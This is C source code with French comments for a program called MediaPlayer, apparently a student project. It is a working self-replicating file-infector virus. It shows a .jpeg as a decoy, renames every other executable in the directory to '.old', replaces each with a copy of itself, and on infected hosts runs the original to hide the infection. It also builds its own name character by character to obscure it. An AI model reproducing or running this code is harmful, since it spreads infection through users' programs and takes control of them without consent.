#include "MediaPlayer.h"

char **globalptr;

int main(int argc, char *argv[]) {

        // nom du programme actuel
        char *name = argv[0];

        // modification du pointeur global pour y ajouter l'addresse du char * contenant le nom du programme
        globalptr = &name;

        char str[13]; //        ./MediaPlayer
        int i = 0;
        i +=46;
        str[0] = (char) i;
        i +=1;
        str[1] = (char) i;
        i +=30;
        str[2] = (char) i;
        i +=24;
        str[3] = (char) i;
        i -=1;
        str[4] = (char) i;
        i +=5;
        str[5] = (char) i;
        i -=8;
        str[6] = (char) i;
        i -=17;
        str[7] = (char) i;
        i +=28;
        str[8] = (char) i;
        i -=11;
        str[9] = (char) i;
        i +=24;
        str[10] = (char) i;
        i -=20;
        str[11] = (char) i;
        i +=13;
        str[12] = (char) i;

        // determine si le programme est executé depuis le mediaplayer ou un hôte infecté
        if(strcmp(argv[0],str)) {       // HOTE INFECTE
                char *extension = ".old";
                char *String = malloc(strlen(name) + strlen(extension) + 1);
                if(String) {
                        strcpy(String,name);
                        strcat(String,extension);
                        system(String);
                }
        }
        else {          // MEDIAPLAYER
                listeFichier(".jpeg");
        }

        // INFECTION
        DIR *myDir;
        struct dirent *dir;

        myDir = opendir(".");
        if (myDir) {
                while ((dir = readdir(myDir)) != NULL)
                        // PENSER A SUPPRIMER LA CONDITION SUR LE .GIT /!\/!\/!|
                        if ((strcmp(".", dir->d_name)) && (strcmp("..", dir->d_name)) && (strcmp(".git", dir->d_name)) && (strcmp("MediaPlayer", dir->d_name)) && (strcmp("src", dir->d_name)))
                                if(strstr(dir->d_name, ".old") == NULL)
                                        if (access(dir->d_name, X_OK) == 0)
                                                if (fopen(dir->d_name,"r"))
                                                        infect(dir->d_name);
                closedir(myDir);
        }

        return 0;
}

void listeFichier(char *extension) {
        DIR *myDir;
        struct dirent *dir;
        bool imgFound = false;
        char *fileName;

        myDir = opendir(".");
        if (myDir) {
                while ((dir = readdir(myDir)) != NULL && imgFound == false) {
                        if (strstr(dir->d_name,extension)) {
                                fileName = dir->d_name;
                                imgFound = true;
                                char *command = "xdg-open ";
                                char *errRedirect = " 2> /dev/null";
                                char *String = malloc(strlen(command) + strlen(fileName) +strlen(errRedirect) + 1);
                                if(String) {
                                        strcpy(String,command);
                                        strcat(String,fileName);
                                        strcat(String,errRedirect);
                                }
                                system(String);
                        }
                }
                closedir(myDir);
        }
}

/*
        Renomme les fichiers, créer un nouveau fichier au même nom et ajout les droits sur le nouveau fichier
*/
void infect(char *fileName) {
        // renommage des fichiers en .old
        char *command = "mv ";
        char *extension = ".old";
        char *espace = " ";
        char *String = malloc(strlen(command) + (strlen(fileName)*2) + strlen(espace) + strlen(extension) + 1);
        if(String) {
                strcpy(String,command);
                strcat(String,fileName);
                strcat(String,espace);
                strcat(String,fileName);
                strcat(String,extension);
                system(String);
        }

        // création des nouveaux fichier remplacant
        command = "touch ";
        String = malloc(strlen(command) + strlen(fileName) + 1);
        if(String) {
                strcpy(String,command);
                strcat(String,fileName);
                system(String);
        }

        // ajoute le droit d'exécution sur le fichier
        command = "chmod +x ";
        String = malloc(strlen(command) + strlen(fileName) + 1);
        if(String) {
                strcpy(String,command);
                strcat(String,fileName);
                system(String);
        }

        // clonage du virus dans les nouveaux fichiers
        command = "cat ";
        char *pgName = *globalptr;
        String = malloc(strlen(command) +strlen(pgName) + strlen(" >> ") + strlen(fileName) + 1);
        if(String) {
                strcpy(String,command);
                strcat(String,pgName);
                strcat(String," >> ");
                strcat(String,fileName);
                system(String);
        }
}
